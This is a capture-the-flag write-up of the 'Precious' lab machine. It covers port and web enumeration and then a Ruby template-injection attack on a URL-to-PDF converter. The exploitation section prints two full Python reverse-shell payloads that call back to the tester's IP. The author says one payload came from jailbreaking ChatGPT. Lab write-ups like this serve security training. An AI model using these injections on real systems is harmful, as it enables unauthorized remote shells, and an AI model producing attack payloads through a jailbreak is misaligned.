# Precious (Easy)

<figure><img src="../../../.gitbook/assets/Precious (1).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated UDP ports:

```
```

Notes:

* 80 and 22 is open, providing a possible entry point from both ports
* Added precious.htb to /etc/hosts
* Viewed source code on precious.htb and could not find any secrets
* Exhausted enumeration, the only thing that is left is to play with the web application itself to see if we can break/force functionality

## Enumeration

### Port 80 - HTTP (nginx 1.18.0)

#### Visual Inspection

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

#### Directory Bruteforce

```
dirsearch -u http://precious.htb
```

* No results

```
feroxbuster -u http://precious.htb ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://precious.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w       18c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       18l       42w      483c http://precious.htb/
[####################] - 40s    30000/30000   0s      found:1       errors:0      
[####################] - 40s    30000/30000   748/s   http://precious.htb/
```

* Nothing found

#### Subdomain Enumeration

```
ffuf -u http://precious.htb -H "Host: FUZZ.precious.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 145

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://precious.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.precious.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 145
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 1052 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

* No results

#### Web Server Fingerprinting

{% code overflow="wrap" %}
```
whatweb precious.htb
http://precious.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.129.244.33], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
{% endcode %}

* nginx 1.18.0
* Ruby-on-Rails
* Phusion Passenger(R) 6.0.15 -- Ran searchsploit -- no luck

#### Vulnerability Scan

```
nikto -h http://precious.htb
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.129.244.33
+ Target Hostname:    precious.htb
+ Target Port:        80
+ Start Time:         2023-04-19 16:30:55 (GMT-4)
---------------------------------------------------------------------------
+ Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
+ /: Retrieved x-powered-by header: Phusion Passenger(R) 6.0.15.
+ /: Uncommon header 'x-runtime' found, with contents: Ruby.
+ /FFjnCpnU.chl+: Uncommon header 'x-cascade' found, with contents: pass.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ : Server banner changed from 'nginx/1.18.0 + Phusion Passenger(R) 6.0.15' to 'nginx/1.18.0'.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ 7962 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2023-04-19 16:38:13 (GMT-4) (438 seconds)
```

* No findings

#### Web Application Testing

Decided to begin testing the web application at this point. Let's see if we can communicate back to our box via python web server:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Confirmed, we can communicate successfully. How can we exploit this behavior?

I attempted to make the application fetch itself, but that did not work.

#### Burpsuite Request Analysis

Upon starting a python web server and attempting to fetch myself, I noticed a % at the top of the Response in Burp. This is an obvious sign that some sort of template is used on the backend.&#x20;

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* Since our server is utilizing Ruby-on-Rails, why not attempt Ruby SSTI?

## Exploitation

### Ruby-based Server Side Template Injection (SSTI)

I was able to test and locate this vulnerability using simple arithmetic logic directly into the user input field on the web app.&#x20;

After I was able to confirm code execution was taking place, the next logical step is to replace the benign payload with a more malicious one and attempt to execute a reverse shell.

<mark style="color:yellow;">Ruby SSTI Python-based Reverse Shell Payload</mark>:

{% code overflow="wrap" %}
```
http://10.10.14.38/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.38",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Using a Jailbreak on ChatGPT, I was also able to craft a payload:

{% embed url="https://www.digitaltrends.com/computing/how-to-jailbreak-chatgpt/" %}

ChatGPT Payload (Jailbroken):

{% code overflow="wrap" %}
```
http://10.10.14.38/?name=#{`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.38\",1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'`}"}
```
{% endcode %}

There was another way of doing this... If you download the generated PDF, you can use exiftool to view metadata and hex data. Inside at the end, there is a header that shows that it is generated by <mark style="color:yellow;">pdfkit v0.8.6.</mark>

## Privilege Escalation

### Local enumeration

### PrivEsc vector

